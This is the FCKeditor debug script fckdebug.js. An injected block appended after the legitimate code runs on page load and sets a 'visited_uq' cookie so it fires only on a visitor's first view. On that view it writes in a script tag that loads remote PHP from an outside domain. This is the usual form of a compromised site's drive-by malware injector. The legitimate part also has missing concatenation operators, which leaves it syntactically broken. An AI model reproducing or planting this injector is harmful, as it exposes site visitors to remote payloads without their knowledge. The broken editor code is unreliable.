/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckdebug.js
 * 	Debug window control and operations.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKDebug = new Object() ;

if ( FCKConfig.Debug )
{
	FCKDebug.Output = function( message, color, noParse )
	{
		if ( ! FCKConfig.Debug ) return ;
		
		if ( !noParse && message != null && isNaN( message ) )
			message = message.replace(/</g, "&lt;") ;

		if ( !this.DebugWindow || this.DebugWindow.closed )
			this.DebugWindow = window.open( FCKConfig.BasePath   'fckdebug.html', 'FCKeditorDebug', 'menubar=no,scrollbars=no,resizable=yes,location=no,toolbar=no,width=600,height=500', true ) ;
		
		if ( this.DebugWindow.Output)
		{
			try 
			{
				this.DebugWindow.Output( message, color ) ;
			} 
			catch ( e ) {}	 // Ignore errors
		}
	}

	FCKDebug.OutputObject = function( anyObject, color )
	{
		var message ;
		
		if ( anyObject != null ) 
		{
			message = 'Properties of: '   anyObject   '</b><blockquote>' ;
			
			for (var prop in anyObject)
			{
				var sVal = anyObject[ prop ] ? anyObject[ prop ]   '' : '[null]' ;
				try 
				{
					message  = '<b>'   prop   '</b> : '   sVal.replace(/</g, '&lt;')   '<br>' ;
				} 
				catch (e)
				{
					message  = '<b>'   prop   '</b> : ['   typeof( anyObject[ prop ] )   ']<br>' ;
				}
			}

			message  = '</blockquote><b>' ; 
		} else
			message = 'OutputObject : Object is "null".' ;
			
		FCKDebug.Output( message, color, true ) ;
	}
}
else
{
	FCKDebug.Output			= function() {}
	FCKDebug.OutputObject	= function() {}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
